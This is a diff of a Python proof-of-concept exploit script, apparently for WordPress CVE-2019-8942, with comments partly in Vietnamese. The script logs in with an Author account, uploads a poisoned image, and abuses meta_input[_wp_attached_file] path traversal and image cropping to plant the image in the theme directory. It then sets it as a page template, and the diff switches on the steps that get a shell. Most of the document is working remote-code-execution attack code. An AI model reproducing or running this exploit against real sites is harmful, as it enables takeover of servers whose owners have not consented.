@@ -72,8 +72,8 @@ class DemoPOC(object):
             print("cannot upload file")
             print(ee)
         # img == {
-            #       'id': 6,
-            #       'file': 'p.jpg'
+            #       'id': 41,
+            #       'file': 'h.jpg'
             #       'url': 'http://www.example.com/wp-content/uploads/2012/04/16/picture.jpg',
             #       'type': 'image/jpeg',
             # }
@@ -101,6 +101,7 @@ class DemoPOC(object):
         #       'url': 'http://www.example.com/wp-content/uploads/2012/04/16/picture.jpg',
         #       'type': 'image/jpeg',
         # }
+        print("Uplaod ảnh nhiễm độc thành công!")
         return response
     
     def Update_Image(self,turn):
@@ -110,10 +111,6 @@ class DemoPOC(object):
             url=self.targetUrl+'/wp-admin/post.php'
             img=self.img_uploaded['post_name']
             data=self.post_data_update
-                #"meta_input[_wp_attached_file]":"2020/04/"+img['post_name']+".jpg#/="+img['post_name']+".jpg"
-                #&meta_input[_wp_attached_file]=2020/05/p.jpg#/p.jpg
-                #"meta_input[_wp_attached_file]":"2020/04/p.jpg#/../../../../themes/twentyseventeen/p.jpg"
-                #"meta_input[_wp_attached_file]":"2020/04/../../../themes/twentyseventeen/pp.jpg"
             if(turn==1):
                 data["meta_input[_wp_attached_file]"]="2020/08/"+img+"#/"+img
             elif(turn==2):
@@ -136,12 +133,12 @@ class DemoPOC(object):
             #auth=auth
             )
             prepped = s.prepare_request(req)
-            proxies={'http': 'http://10.9.2.23:9090'} 
+            #proxies={'http': 'http://10.9.2.23:9090'} 
             resp = s.send(prepped,
-            proxies=proxies
+            #proxies=proxies
         # timeout=timeout
             )
-            print("Thành công")
+            print("Chỉnh sửa thành công")
             print(resp.status_code)
     def SaveCroppedImage(self):
             s = Session()
@@ -176,13 +173,13 @@ class DemoPOC(object):
             headers=headers
             )
             prepped = s.prepare_request(req)
-            proxies={'http': 'http://10.9.2.23:9090'} 
+            #proxies={'http': 'http://10.9.2.23:9090'} 
             resp = s.send(prepped,
-            proxies=proxies
+            #proxies=proxies
             #timeout=timeout
             )
             if(resp.status_code==200):
-                print("EXPLOIT SUCCESSFUL")
+                print("Save Cropped Image successfully")
             print(resp)
             #Lấy giá trị của file Cropped vào Theme: Example: h-e1596731027832.jpg
             #content=b'{"fw":300,"fh":286,"thumbnail":"http:\\/\\/10.9.2.0\\/wordpress480\\/wp-content\\/uploads\\/2020\\
@@ -199,7 +196,8 @@ class DemoPOC(object):
                     injected_img+=content[i]
                     if(content[i+1]=='"'):
                         break
-            print('Inject to theme:'+injected_img)
+            print("Save Cropped Response:"+content)
+            print('New image path:'+injected_img)
             self.injected_img=injected_img
             #########XU LY LAY THOG TIN CHO self.injected_img
     def getCookies(self,cookieSession):
@@ -225,7 +223,7 @@ class DemoPOC(object):
                 b = s.get(self.targetUrl+'/wp-login.php')
                 a = s.post(self.targetUrl+'/wp-login.php',data=self.atLeastAuthorAccount)
                 self.cookies=self.getCookies(s.cookies._cookies)
-                x=1
+                #x=1
             except Exception as ee:
                 print(ee)
             forGetNonce=s.get(self.targetUrl+'/wp-admin/post.php?post='+self.img_uploaded['id']+'&action=edit')
@@ -240,7 +238,7 @@ class DemoPOC(object):
                     counter+=1
                 except:
                     pass
-            print("Get "+str(counter)+" hidden input:")
+            #print("Get "+str(counter)+" hidden input:")
             # for i in post_data_update:  
             #     print(i)
             try:
@@ -287,6 +285,7 @@ class DemoPOC(object):
         url=self.targetUrl+'/wp-admin/post.php'
         data=post_data_add_post
         data["meta_input[_wp_page_template]"]=self.injected_img
+
         headers={
             "Host": self.hostname,
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
@@ -310,7 +309,7 @@ class DemoPOC(object):
             #timeout=timeout
             )
         if(resp.status_code==200):
-            print("EXPLOIT SUCCESSFUL")   
+            print("Exploit Successfully")   
         print("Visit this malicious site to se result")    
         print(self.targetUrl+'/?p='+post_data_add_post['post_ID'])
 #START CODE
@@ -318,17 +317,18 @@ import argparse
 if __name__ == "__main__":
     # parse command line arguments
     parser = argparse.ArgumentParser()
-    parser.add_argument('--targetUrl', help='target site\'s context root url like http://www.example.com/demo/')
-    parser.add_argument('--username', help='Username with at least Author privilege')
-    parser.add_argument('--password', help='Password with at least Author privilege')
+    print('Example: python 2019-8942-RCE.py http://10.25.0.0/wordpress500 author 123456')
+
+    parser.add_argument('targetUrl', help='target site\'s context root url like http://www.example.com/demo/')
+    parser.add_argument('username', help='Username with at least Author privilege')
+    parser.add_argument('password', help='Password with at least Author privilege')
     parser.add_argument('--img-path', help='Img path')
     
     args = parser.parse_args()
     #For debugging
-    args.targetUrl='http://10.9.2.0/wordpress480'
-    args.username='author1'
-    args.password='author'
+
     exploit=DemoPOC(args)
-    #exploit.DefineMaliciousImage()
-    #exploit.Exploit()
+    
+    exploit.DefineMaliciousImage()
+    exploit.Exploit()
     exploit.GetShell()
